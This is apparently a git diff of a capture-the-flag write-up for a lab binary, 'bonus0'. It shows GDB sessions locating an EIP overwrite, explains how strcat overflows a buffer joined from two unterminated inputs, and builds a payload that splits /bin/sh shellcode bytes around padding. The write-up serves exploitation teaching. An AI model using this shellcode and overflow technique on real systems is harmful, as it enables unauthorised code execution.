@@ -26,20 +26,20 @@ Program received signal SIGSEGV, Segmentation fault.
 0x41336141 in ?? ()
 ```
 
-> As long that the first input is full (20 characters long) we still find the same EIP offset.
-> 
-> ```bash
-> (gdb) run
-> Starting program: /home/user/bonus0/bonus0
->  -
-> AAAAAAAAAAAAAAAAAAAA
->  -
-> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
-> AAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���
-> 
-> Program received signal SIGSEGV, Segmentation fault.
-> 0x41336141 in ?? ()
-> ```
+As long that the first input is full (20 characters long) we still find the same EIP offset.
+ 
+```bash
+(gdb) run
+Starting program: /home/user/bonus0/bonus0
+ -
+AAAAAAAAAAAAAAAAAAAA
+ -
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+AAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41336141 in ?? ()
+```
 
 Why that? Since the two buffer of `pp` are following each others.
 Since `first` is not null terminated, we continue on `second`.
@@ -48,37 +48,37 @@ Since `first` is not null terminated, we continue on `second`.
 2. A space is added, at the end of the buffer, making it of length `25`.
 3. `strcat` will then add another `20 (second's length)` + `4 (garbage)` to the `buffer`, overflowing it.
 
-> This can be verified using GDB:
-> 
-> ```bash
-> (gdb) break *pp+122 # at `call   0x8048390 <strcat@plt>`
-> (gdb) run
-> Starting program: /home/user/bonus0/bonus0
->  -
-> AAAAAAAAAAAAAAAAAAAA
->  -
-> BBBBBBBBBBBBBBBBBBBB
-> 
-> Breakpoint 1, 0x08048598 in > pp ()
-> ```
-> 
-> We can verify that the `second`'s length is `24`.
-> 
-> ```bash
-> (gdb) x *(void**)($esp+4)
-> 0xbffff62c:      'B' <repeats 20 times>"\364, ", <incomplete sequence \375\26
-> (gdb) call strlen(*(void**)($esp+4))
-> $1 = 24
-> ```
-> 
-> And that the `buffer`'s length before concat is 45.
-> 
-> ```bash
-> (gdb) x *(void**)$esp
-> 0xbffff666:      'A' <repeats 20 times>, 'B' <repeats 20 times>"\364, \017\375\267 "
-> (gdb) call strlen(*(void**)$esp)
-> $2 = 45
-> ```
+This can be verified using GDB:
+
+```bash
+(gdb) break *pp+122 # at `call   0x8048390 <strcat@plt>`
+(gdb) run
+Starting program: /home/user/bonus0/bonus0
+ -
+AAAAAAAAAAAAAAAAAAAA
+ -
+BBBBBBBBBBBBBBBBBBBB
+
+Breakpoint 1, 0x08048598 in > pp ()
+```
+
+We can verify that the `second`'s length is `24`.
+
+```bash
+(gdb) x *(void**)($esp+4)
+0xbffff62c:      'B' <repeats 20 times>"\364, ", <incomplete sequence \375\26
+(gdb) call strlen(*(void**)($esp+4))
+$1 = 24
+```
+
+And that the `buffer`'s length before concat is 45.
+
+```bash
+(gdb) x *(void**)$esp
+0xbffff666:      'A' <repeats 20 times>, 'B' <repeats 20 times>"\364, \017\375\267 "
+(gdb) call strlen(*(void**)$esp)
+$2 = 45
+```
 
 Since we can have a continuous payload of `29 bytes`, we can store a `shell code` directly into the buffer.
 
@@ -100,7 +100,7 @@ We can craft the payload as follow:
 # first 15 bytes of the shell code
 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3"
 
-# padding of 4096 - payload - new line
+# padding of 4096 - payload - new line, to return from `read(4096)`
 + "A" * (4096 - 20 - 1) + "\n"
 
 # last 9 bytes of the shell code
